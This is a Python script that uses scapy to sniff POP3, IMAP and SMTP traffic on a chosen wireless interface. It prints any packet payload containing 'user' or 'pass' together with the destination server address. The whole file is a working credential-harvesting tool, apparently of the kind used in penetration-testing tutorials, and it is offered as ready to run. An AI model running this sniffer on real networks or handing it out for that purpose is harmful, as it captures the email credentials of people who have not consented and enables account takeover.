import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.info("finished")
logging.captureWarnings(True)
from scapy.all import *
import time
from optparse import OptionParser
#supress annoying scapy warnings
import requests.packages.urllib3
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()

parser = OptionParser(usage="usage: sudo %prog [options]")
parser.add_option("-t", "--time", action="store", dest="time", default=100, type=int, help="Total time to sniff packets.")
parser.add_option("-i", "--interface", action="store", dest="iface", default="wlan0", help="Interface to use. Default: wlan0.")
(options, args) = parser.parse_args()
if len(args) < 2:
    interface = options.iface
    time = options.time

OK_GREEN = "\033[92m"
OK_BLUE = "\033[94m"
ERR = "\033[91m"
ENDC = "\033[0m"

#handle colors
def printMsg(s):
    print(OK_BLUE + "[*]" + ENDC + " " + s)
def printGood(s):
    print(OK_GREEN + "[*]" + ENDC + " " + s)
def printErr(s):
    print(ERR + "[!]" + ENDC + " " + s)

#packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            printGood("Server: %s" % packet[IP].dst)
            printGood("%s" % packet[TCP].payload)
try:
    #start sniffer
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=time, iface=interface)
    printMsg("Running for %i seconds..." % options.time)
    #port 110 = POP3
    #port 143 = IMAP
    #port 25  = SMTP
    printMsg("Scanner has finished after %i seconds." % options.time)
    exit(0)
except OSError as e: #catch unknown interface OSError
    printErr("Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
    exit(1)
